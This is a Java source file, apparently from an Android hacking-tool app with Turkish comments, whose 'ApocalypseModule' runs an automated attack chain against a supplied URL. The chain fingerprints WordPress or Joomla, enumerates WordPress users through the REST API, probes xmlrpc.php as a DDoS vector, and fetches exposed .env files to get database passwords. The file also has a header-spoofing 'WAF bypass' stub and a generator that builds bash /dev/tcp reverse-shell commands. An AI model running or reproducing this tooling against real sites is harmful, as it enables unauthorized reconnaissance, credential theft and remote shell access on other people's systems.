package com.example.karageyazilimsecuritylab;

public class ApocalypseModule {

    // AUTO-PWN (Soru sormaz, yok eder)
    public static void startChainAttack(String url, RequestManager.Callback callback) {
        callback.onResult("<font color='#FF0000'>☠️ APOCALYPSE ZİNCİRİ BAŞLATILIYOR...</font>");

        RequestManager.submit(() -> {
            String res = RequestManager.makeHttpRequest(url);
            String body = res.contains("||BODY:") ? res.split("\\|\\|BODY:")[1].toLowerCase() : "";

            String targetType = "GENEL";
            if(body.contains("wp-content")) targetType = "WORDPRESS";
            else if(body.contains("joomla")) targetType = "JOOMLA";

            callback.onResult("[+] TESPİT EDİLEN ALTYAPI: " + targetType);
            callback.onResult("[*] Saldırı vektörleri yükleniyor... (3sn)");

            try { Thread.sleep(3000); } catch (InterruptedException e) {}

            // WordPress Saldırı Zinciri
            if(targetType.equals("WORDPRESS")) {
                callback.onResult("<font color='#FFA500'>[1/3] Kullanıcı Enum (REST API)...</font>");
                String userRes = RequestManager.makeHttpRequest(url + "/wp-json/wp/v2/users");
                if(userRes.contains("slug")) callback.onResult("<font color='#00FF00'>[✔] Kullanıcı listesi çekildi!</font>");
                else callback.onResult("[-] Kullanıcılar gizli.");

                callback.onResult("<font color='#FFA500'>[2/3] XMLRPC DDoS Kontrolü...</font>");
                String xmlRes = RequestManager.makeHttpRequest(url + "/xmlrpc.php");
                if(xmlRes.contains("XML-RPC server accepts POST")) callback.onResult("<font color='#00FF00'>[✔] XMLRPC Açık! (Saldırıya Uygun)</font>");
            }

            // Genel Saldırı Zinciri
            callback.onResult("<font color='#FFA500'>[3/3] Kritik Dosya Kontrolü...</font>");
            String envCheck = RequestManager.makeHttpRequest(url + "/.env");
            if(envCheck.startsWith("CODE:200")) callback.onResult("<font color='#FF0000'>[!!!] .env DOSYASI AÇIK (DB Şifreleri)!</font>");
            else callback.onResult("[-] .env dosyası güvenli.");

            callback.onResult("✅ ZİNCİRLEME SALDIRI TAMAMLANDI.");
        });
    }

    // WAF Bypass (Hayalet Modu)
    public static void runWafBypass(String url, RequestManager.Callback callback) {
        callback.onResult("👻 WAF ATLATMA (IP SPOOFING): " + url);
        RequestManager.submit(() -> {
            String[] headers = {"X-Originating-IP: 127.0.0.1", "X-Forwarded-For: 127.0.0.1", "Client-IP: 127.0.0.1"};
            for(String h : headers) {
                callback.onResult("Enjekte ediliyor -> " + h);
                // Burada RequestManager'a header ekleme özelliği eklenebilir
                try { Thread.sleep(500); } catch (Exception e){}
            }
            callback.onResult("<font color='#00FF00'>[✔] Headerlar gönderildi. Yanıtları kontrol et.</font>");
        });
    }

    // Payload Generator
    public static void generatePayload(String type, String ip, String port, RequestManager.Callback callback) {
        String code = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
        callback.onResult("☢️ PAYLOAD (" + type + "): " + code);
    }
}